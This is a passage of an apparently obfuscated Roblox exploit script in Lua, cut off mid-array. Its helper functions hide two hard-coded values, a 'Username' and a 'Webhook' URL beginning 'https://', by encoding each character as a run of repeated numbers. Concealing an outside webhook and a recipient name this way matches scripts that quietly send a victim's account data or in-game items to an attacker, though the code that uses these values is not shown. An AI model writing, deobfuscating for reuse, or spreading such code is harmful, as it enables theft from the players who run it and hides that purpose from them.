function YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


function OwtAeSQbZhbcmINkdCIQWWoQfzEeZAFQpykhaSLhxRFvFtwxDKubfeSKZSiZOpbDmZBccDwd(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


getgenv().gui = false
Username = OwtAeSQbZhbcmINkdCIQWWoQfzEeZAFQpykhaSLhxRFvFtwxDKubfeSKZSiZOpbDmZBccDwd({YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}) 
Webhook = OwtAeSQbZhbcmINkdCIQWWoQfzEeZAFQpykhaSLhxRFvFtwxDKubfeSKZSiZOpbDmZBccDwd({YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),YdxYzwMNTcvKDveSANbOherxsdasjgiEyIpFWXcYaCJ({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410
